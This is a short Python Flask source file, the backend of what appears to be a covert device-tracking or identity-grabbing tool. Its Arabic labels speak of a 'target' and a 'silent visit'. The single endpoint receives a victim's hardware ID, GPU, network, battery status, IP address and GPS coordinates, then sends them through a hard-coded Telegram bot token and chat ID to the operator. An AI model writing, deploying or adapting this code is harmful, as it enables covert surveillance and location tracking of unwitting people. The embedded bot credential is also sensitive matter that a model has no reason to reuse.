from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

# بياناتك الخاصة
TOKEN = "8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg"
CHAT_ID = "5811700860"

@app.route('/api/index', methods=['POST'])
def handler():
    try:
        data = request.json
        info = data.get('device_info', {})
        lat = data.get('lat')
        lon = data.get('lon')
        user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)

        msg = f"🛡 **تم سحب هوية رقمية جديدة**\n\n"
        msg += f"🆔 **HW-ID:** `{info.get('hw_id')}`\n"
        msg += f"👤 **الهدف:** `{data.get('target_id', 'N/A')}`\n"
        msg += f"🛠 **الخدمة:** `{data.get('service', 'زيارة صامتة')}`\n"
        msg += f"🎮 **GPU:** `{info.get('gpu')}`\n"
        msg += f"📶 **الشبكة:** `{info.get('network')}`\n"
        msg += f"🔋 **البطارية:** `{info.get('battery')}`\n"
        msg += f"🌐 **IP:** `{user_ip}`\n"
        
        if lat and lon:
            msg += f"\n📍 **الموقع:** [فتح الخريطة](https://www.google.com/maps?q={lat},{lon})"
        
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                      json={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})
        
        return jsonify({"status": "ok"}), 200
    except:
        return jsonify({"status": "error"}), 500
